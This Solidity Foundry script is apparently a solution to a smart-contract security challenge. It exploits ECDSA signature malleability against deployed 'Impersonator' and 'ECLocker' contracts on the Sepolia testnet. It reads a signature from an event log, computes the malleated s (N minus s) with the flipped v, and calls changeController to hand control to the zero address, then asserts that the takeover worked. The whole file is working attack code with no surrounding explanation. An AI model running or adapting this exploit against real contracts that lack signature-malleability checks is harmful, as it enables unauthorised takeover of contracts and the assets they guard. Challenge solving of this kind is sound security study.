// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {Impersonator, ECLocker} from "../src/Impersonator.sol";

contract DeployImpersonatorAttack is Script {
    address private constant IMPERSONATOR_ADDRESS = 0x6fB2f9F7aA47A5D0299B14c16E531bb426aF9923;
    address private constant ECLOCKER_ADDRESS = 0xdD1376DA1A988D9c35562C9Aa06A68d8a5fc7237;
    // Secp256k1 curve order
    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    // --- Extracted Original Signature from NewLock event data ---
    // https://sepolia.etherscan.io/address/0x6fb2f9f7aa47a5d0299b14c16e531bb426af9923#events
    bytes32 private constant R_ORIGINAL_FROM_LOG = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
    bytes32 private constant S_ORIGINAL_FROM_LOG = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
    uint8 private constant V_ORIGINAL_FROM_LOG = 27; // 0x1b in hex

    function run() external {
        vm.startBroadcast();

        // Load existing contract instances
        Impersonator impersonator = Impersonator(IMPERSONATOR_ADDRESS);
        ECLocker eclocker = ECLocker(ECLOCKER_ADDRESS);

        console2.log("Interacting with Impersonator at:", address(impersonator));
        console2.log("Interacting with ECLocker at:", address(eclocker));
        console2.log("Current ECLocker controller:", eclocker.controller());

        // --- Prepare the Malleable Signature ---
        console2.log("\n--- ORIGINAL SIGNATURE (extracted from event log) ---");
        console2.log("Original r:");
        console2.logBytes32(R_ORIGINAL_FROM_LOG);
        console2.log("Original s:");
        console2.logBytes32(S_ORIGINAL_FROM_LOG);
        console2.log("Original v:", V_ORIGINAL_FROM_LOG);

        // Calculate s' (s_malleated)
        uint256 s_malleated_uint = SECP256K1_N - uint256(S_ORIGINAL_FROM_LOG);
        bytes32 s_malleated = bytes32(s_malleated_uint);

        // Determine v' (v_malleated)
        // v (Recovery ID): This is a small integer (usually 27 or 28, or 0 or 1 if EIP-155 is used)
        // If v was 27, it becomes 28. If v was 28, it becomes 27.
        uint8 v_malleated = (V_ORIGINAL_FROM_LOG == 27) ? 28 : 27;

        console2.log("\n--- MALLEABLE SIGNATURE FOR ATTACK ---");
        console2.log("Malleated r (same):");
        console2.logBytes32(R_ORIGINAL_FROM_LOG);
        console2.log("Malleated s (N - s):");
        console2.logBytes32(s_malleated);
        console2.log("Malleated s (N - s):");
        console2.logBytes32(s_malleated);
        console2.log("Malleated v (adjusted):", v_malleated);
        console2.log("Malleated s (uint):", s_malleated_uint);

        // Target: set controller to the null address
        address newController = address(0);
        console2.log("Targeting new controller:", newController);

        // --- Execute the Attack: Call changeController with Malleable Signature ---
        console2.log("\nCalling changeController() with malleable signature to set controller to 0x0...");

        // Attack call
        eclocker.changeController(v_malleated, R_ORIGINAL_FROM_LOG, s_malleated, newController);
        console2.log("changeController() call SUCCESSFUL (VULNERABILITY CONFIRMED).");

        // Verify the controller has been changed to the null address
        console2.log("New ECLocker controller (after attack):", eclocker.controller());
        assert(eclocker.controller() == address(0));
        require(eclocker.controller() == address(0), "Controller should have been set to the null address!");

        // Verify the malleable signature is now marked as used
        bytes32 malleableSignatureHash = keccak256(abi.encode(uint256(R_ORIGINAL_FROM_LOG), s_malleated_uint, uint256(v_malleated)));
        assert(eclocker.usedSignatures(malleableSignatureHash));
        require(eclocker.usedSignatures(malleableSignatureHash), "Malleable signature should now be marked used!");

        vm.stopBroadcast();
    }
}
